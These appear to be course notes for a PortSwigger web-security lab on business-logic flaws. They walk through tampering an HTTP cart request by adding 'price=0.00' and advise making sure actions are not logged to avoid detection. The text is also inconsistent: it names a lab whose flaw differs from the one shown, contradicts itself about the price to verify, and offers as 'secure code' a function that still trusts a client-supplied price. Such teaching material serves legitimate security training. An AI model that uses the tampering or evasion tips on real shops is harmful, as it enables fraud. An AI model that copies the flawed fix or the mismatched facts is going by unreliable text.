---
course: Web Security
topic: Business Logic Vulnerabilities
tags: [web-security]
---

## Analyzing the Purchasing Workflow

To exploit the logic flaw in the purchasing workflow, you first need to understand how the application handles the purchase process. This involves analyzing the HTTP requests and responses to identify potential vulnerabilities.

### Step-by-Step Analysis

1. **Login**: Use the provided credentials to log in to the application.
2. **Browse Products**: Navigate to the product page and select the lightweight leader jacket.
3. **Add to Cart**: Add the jacket to your cart and proceed to the checkout page.
4. **Review Order**: Review the order details and note the intended price of the jacket.

### Capturing HTTP Requests

Using Burp Suite, capture the HTTP requests and responses for each step of the purchasing workflow. This will help you identify the specific parameters and values that are being sent to the server.

#### Example HTTP Request

Here is an example of the HTTP request sent when adding the jacket to the cart:

```http
POST /cart/add HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

item_id=123&quantity=1
```

#### Example HTTP Response

And here is the corresponding HTTP response:

```http
HTTP/1.1 200 OK
Date: Mon, 20 Nov 2023 12:00:00 GMT
Content-Type: application/json
Set-Cookie: session=abc123; Path=/; HttpOnly

{
    "status": "success",
    "message": "Item added to cart",
    "cart": {
        "items": [
            {
                "id": 123,
                "name": "Lightweight Leader Jacket",
                "price": 100.00,
                "quantity": 1
            }
        ]
    }
}
```

### Identifying the Logic Flaw

By analyzing the HTTP requests and responses, you can identify potential logic flaws in the purchasing workflow. For example, you might notice that the application does not properly validate the quantity or price of the items being added to the cart.

#### Potential Vulnerability

One potential vulnerability is that the application does not enforce a minimum price for items in the cart. This means that an attacker could manipulate the quantity or price to purchase the jacket for an unintended price.

### Exploiting the Logic Flaw

To exploit the logic flaw, you can modify the HTTP request to set the price of the jacket to a lower value. For example, you can change the price to $0.00 to purchase the jacket for free.

#### Modified HTTP Request

Here is an example of the modified HTTP request:

```http
POST /cart/add HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

item_id=123&quantity=1&price=0.00
```

#### Modified HTTP Response

And here is the corresponding HTTP response:

```http
HTTP/1.1 200 OK
Date: Mon, 20 Nov 2023 12:00:00 GMT
Content-Type: application/json
Set-Cookie: session=abc123; Path=/; HttpOnly

{
    "status": "success",
    "message": "Item added to cart",
    "cart": {
        "items": [
            {
                "id": 123,
                "name": "Lightweight Leader Jacket",
                "price": 0.00,
                "quantity": 1
            }
        ]
    }
}
```

### Verifying the Exploit

After modifying the HTTP request, verify that the jacket has been added to the cart at the intended price. Proceed to the checkout page and confirm that the total price reflects the manipulated value.

### Common Pitfalls

When exploiting business logic vulnerabilities, it is important to be aware of common pitfalls that can lead to detection or failure of the exploit. Some common pitfalls include:

- **Logging**: Ensure that your actions are not being logged by the application. This can help avoid detection by security systems.
- **Rate Limiting**: Be mindful of rate limiting mechanisms that may block your IP address after multiple failed attempts.
- **Validation**: Ensure that all required fields are properly filled out to avoid validation errors.

### How to Prevent / Defend Against Business Logic Vulnerabilities

Preventing business logic vulnerabilities requires a comprehensive approach that includes both technical and organizational measures.

#### Secure Coding Practices

- **Input Validation**: Always validate user inputs to ensure they meet the expected format and constraints. For example, validate that prices are within a reasonable range and quantities are non-negative.
- **Business Rule Enforcement**: Enforce business rules consistently across all parts of the application. For example, ensure that only one discount can be applied per transaction.
- **Error Handling**: Implement proper error handling to prevent sensitive information from being exposed in error messages.

#### Example of Secure Code

Here is an example of secure code that enforces business rules:

```python
def add_to_cart(item_id, quantity, price):
    if quantity < 0:
        raise ValueError("Quantity cannot be negative")
    if price < 0:
        raise ValueError("Price cannot be negative")
    if price > 1000:
        raise ValueError("Price exceeds maximum limit")
    
    # Add item to cart
    cart = {
        "items": [
            {
                "id": item_id,
                "name": "Lightweight Leader Jacket",
                "price": price,
                "quantity": quantity
            }
        ]
    }
    return cart
```

#### Configuration Hardening

- **Disable Unnecessary Features**: Disable any features or functionalities that are not required for the application’s core business logic.
- **Enable Security Mechanisms**: Enable security mechanisms such as rate limiting, logging, and monitoring to detect and prevent unauthorized access.

#### Detection and Monitoring

- **Logging**: Implement comprehensive logging to track user activities and detect suspicious behavior.
- **Monitoring**: Monitor the application for unusual patterns or anomalies that may indicate an exploit attempt.
- **Penetration Testing**: Regularly perform penetration testing to identify and remediate business logic vulnerabilities.

### Conclusion

Business logic vulnerabilities are a critical aspect of web application security that require careful attention and thorough validation. By understanding how these vulnerabilities work and how to exploit them, you can better protect your applications from potential attacks. Remember to implement secure coding practices, configure your systems securely, and monitor for suspicious activity to prevent business logic vulnerabilities from being exploited.

### Practice Labs

For hands-on practice with business logic vulnerabilities, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a variety of labs that cover different types of business logic vulnerabilities, including the "Low-Level Logic Flaw" lab we covered in this chapter.
- **OWASP Juice Shop**: Provides a vulnerable web application that includes various business logic vulnerabilities for you to explore and exploit.
- **DVWA (Damn Vulnerable Web Application)**: Another popular web application that includes several business logic vulnerabilities for educational purposes.

By practicing with these labs, you can gain a deeper understanding of how to identify and exploit business logic vulnerabilities, as well as how to defend against them.

---
<!-- nav -->
[[Web Security (PortSwigger)/15-Business Logic Vulnerabilities/06-Lab 5 Low level logic flaw/01-Introduction to Business Logic Vulnerabilities|Introduction to Business Logic Vulnerabilities]] | [[Web Security (PortSwigger)/15-Business Logic Vulnerabilities/06-Lab 5 Low level logic flaw/00-Overview|Overview]] | [[Web Security (PortSwigger)/15-Business Logic Vulnerabilities/06-Lab 5 Low level logic flaw/03-Business Logic Vulnerabilities|Business Logic Vulnerabilities]]
